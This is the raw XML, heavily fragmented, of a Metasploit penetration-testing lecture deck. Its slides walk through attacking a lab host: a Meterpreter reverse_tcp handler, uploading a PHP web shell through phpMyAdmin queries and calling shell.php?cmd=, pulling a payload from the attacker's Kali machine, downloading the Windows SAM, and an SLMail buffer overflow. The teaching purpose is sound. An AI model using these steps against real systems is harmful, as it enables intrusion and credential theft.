              <a:t>msfvenom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Upload using WebDAV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492" y="1771894"/>
            <a:ext cx="5486400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323" y="3928044"/>
            <a:ext cx="6916737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899" y="5545353"/>
            <a:ext cx="7059613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1948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WebDAV Default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up a handler in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to catch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>the payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>before </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>executing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the script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492896"/>
            <a:ext cx="6297613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80103" y="3353200"/>
            <a:ext cx="3025076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Use multi/handler in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, set the payload to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>reverse_tcp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(1), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>(2)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LPORT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>(3) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>appropriately to match </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>the generated </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>payload.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51" y="5372100"/>
            <a:ext cx="7326313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133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Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phpMyAdmin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accessing the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>MySQL database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, we can perform an attack similar to our WebDAV attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>and upload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>scripts to the web server using MySQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>To explore this attack, first navigate to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http://192.168.20.10/phpmyadmin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235767"/>
            <a:ext cx="79835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7092280" y="5990634"/>
            <a:ext cx="144016" cy="43349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236296" y="4877370"/>
            <a:ext cx="1656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default install location for XAMPP’s Apache on Windows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540916"/>
            <a:ext cx="6363766" cy="2696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407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Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phpMyAdmin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the completed query in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phpMyAdmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and then browse to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>the newly </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>created file, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>192.168.20.10/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell.php?cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=............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782888"/>
            <a:ext cx="53721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5169818" y="2664853"/>
            <a:ext cx="2088232" cy="88376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33" y="4221088"/>
            <a:ext cx="8939733" cy="76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H="1">
            <a:off x="5868144" y="3645024"/>
            <a:ext cx="144016" cy="43349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164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Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phpMyAdmin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Rather </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>than creating </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>a really </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>long and complicated SQL SELECT query, we can host a file on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>our Kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>machine and then use our PHP shell to pull it down to the web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>server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Now we can browse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>://192.168.20.10/meterpreter.php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400" y="3212976"/>
            <a:ext cx="6907213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400" y="4005064"/>
            <a:ext cx="799306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31640" y="5986154"/>
            <a:ext cx="5858848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Note: Be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sure to restart the handler to catch the Meterpreter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>connection before executing the script.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3442267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Sensitive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Downloading a Configuration </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>File</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Downloading the Windows SAM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2517496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a Buffer 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SLMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>(5.5) server </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>vulnerable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to the POP3 issue </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2003-0264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35898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Exploiting Third-Party Web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014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a Compromised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58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31055</TotalTime>
  <Words>1622</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>218</Paragraphs>
  <Slides>36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Penetration Testing Using the  Metasploit Framework</vt:lpstr>
      <vt:lpstr>Metasploit Framework</vt:lpstr>
      <vt:lpstr>Metasploit Modules</vt:lpstr>
      <vt:lpstr> Metasploit Update</vt:lpstr>
      <vt:lpstr>Metasploit Startup</vt:lpstr>
      <vt:lpstr>Finding Metasploit Modules</vt:lpstr>
      <vt:lpstr>The Module Database</vt:lpstr>
      <vt:lpstr>Built-In Search</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Exercise</vt:lpstr>
      <vt:lpstr>Setting Module Options</vt:lpstr>
      <vt:lpstr>Example</vt:lpstr>
      <vt:lpstr>Payloads (or Shellcode)</vt:lpstr>
      <vt:lpstr>Finding Compatible Payloads</vt:lpstr>
      <vt:lpstr>A Test Run</vt:lpstr>
      <vt:lpstr>Types of Shells</vt:lpstr>
      <vt:lpstr>Metasploit handlers </vt:lpstr>
      <vt:lpstr>Setting a Payload Manually</vt:lpstr>
      <vt:lpstr>Setting a Payload Manually</vt:lpstr>
      <vt:lpstr>Msfvenom</vt:lpstr>
      <vt:lpstr>Msfvenom</vt:lpstr>
      <vt:lpstr>Msfvenom</vt:lpstr>
      <vt:lpstr>Msfvenom</vt:lpstr>
      <vt:lpstr>Msfvenom</vt:lpstr>
      <vt:lpstr>Exploiting WebDAV Default Credentials</vt:lpstr>
      <vt:lpstr>Exploiting WebDAV Default Credentials</vt:lpstr>
      <vt:lpstr>Exploiting WebDAV Default Credentials</vt:lpstr>
      <vt:lpstr>Exploiting WebDAV Default Credentials</vt:lpstr>
      <vt:lpstr>Exploiting WebDAV Default Credentials</vt:lpstr>
      <vt:lpstr>Exploiting Open phpMyAdmin</vt:lpstr>
      <vt:lpstr>Exploiting Open phpMyAdmin</vt:lpstr>
      <vt:lpstr>Exploiting Open phpMyAdmin</vt:lpstr>
      <vt:lpstr>Downloading Sensitive Files</vt:lpstr>
      <vt:lpstr>Exploiting a Buffer Overflow</vt:lpstr>
      <vt:lpstr>Exploiting Third-Party Web Applications</vt:lpstr>
      <vt:lpstr>Exploiting a Compromised Service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mã độc</dc:title>
  <dc:creator>TTS</dc:creator>
  <cp:lastModifiedBy>tran the son</cp:lastModifiedBy>
  <cp:revision>1489</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-06-08T06:53:33Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-09-27T05:00:56Z</dcterms:modified>
</cp:coreProperties>
</file>